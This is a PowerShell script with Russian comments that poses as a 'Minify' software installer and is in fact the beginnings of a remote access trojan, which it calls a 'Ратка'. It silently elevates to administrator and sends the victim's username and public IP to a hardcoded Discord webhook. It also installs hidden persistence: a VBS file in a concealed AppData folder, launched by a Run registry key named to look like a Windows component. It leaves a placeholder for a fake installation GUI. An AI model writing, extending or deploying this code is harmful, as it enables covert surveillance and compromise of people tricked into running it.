# --- ПРОВЕРКА АДМИН ПРАВ ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$WEBHOOK_URL = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"

# --- ФУНКЦИЯ ЛОГЕРА ---
function Send-LogNotification {
    param([string]$Status, [string]$Message)
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    # Получаем IP
    $ip = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).ToString() } catch { "Unknown" }
    
    # Цвет: Зеленый (SUCCESS), Красный (ERROR), Синий (STARTED)
    $color = 65280
    if ($Status -eq "ERROR") { $color = 16711680 }
    if ($Status -eq "STARTED") { $color = 255 }

    $embed = @{
        title = "Minify Installer Log"
        color = $color
        fields = @(
            @{ name = "Status"; value = $Status; inline = $true },
            @{ name = "User"; value = $env:USERNAME; inline = $true },
            @{ name = "IP"; value = $ip; inline = $true },
            @{ name = "Message"; value = $Message; inline = $false },
            @{ name = "Time"; value = $timestamp; inline = $false }
        )
        footer = @{ text = "Minify v3.2.1" }
    }

    $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10 -Compress
    
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        Invoke-RestMethod -Uri $GLOBALS:WEBHOOK_URL -Method Post -ContentType "application/json" -Body $bytes -ErrorAction SilentlyContinue
    } catch {}
}

$GLOBALS:WEBHOOK_URL = $WEBHOOK_URL

# --- УСТАНОВКА АГЕНТА (АВТОЗАГРУЗКА) ---
function Install-MonitorAgent {
    $monitorDir = "$env:APPDATA\Microsoft\HelpPane"
    $vbsPath = "$monitorDir\monitor.vbs"
    
    if (!(Test-Path $monitorDir)) {
        New-Item -Path $monitorDir -ItemType Directory -Force | Out-Null
        (Get-Item $monitorDir).Attributes += "Hidden"
    }

    # Упрощенный VBS. Он просто запускает скрытую команду PowerShell.
    # Мы не передаем весь код логера внутрь VBS, чтобы не ломать кавычки.
    $vbsContent = @"
On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
' Ждем немного, чтобы интернет проснулся
WScript.Sleep 10000
psCmd = "powershell -NoP -W Hidden -C ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-RestMethod -Uri '$WEBHOOK_URL' -Method Post -ContentType 'application/json' -Body '{\""content\"":\""🚀 Ратка успешно стартовала из автозагрузки на ПК: %USERNAME%\""}'"""
objShell.Run psCmd, 0, False
"@

    $vbsContent | Out-File -FilePath $vbsPath -Encoding Default -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHelpPane" -Value "wscript.exe `"$vbsPath`" //B" -Force
}

# --- ВЫПОЛНЕНИЕ ---
Send-LogNotification -Status "STARTED" -Message "Установщик запущен пользователем"

# Здесь твой GUI и процесс "установки"
# ...

Install-MonitorAgent
Send-LogNotification -Status "SUCCESS" -Message "Установка завершена, агент в автозагрузке"
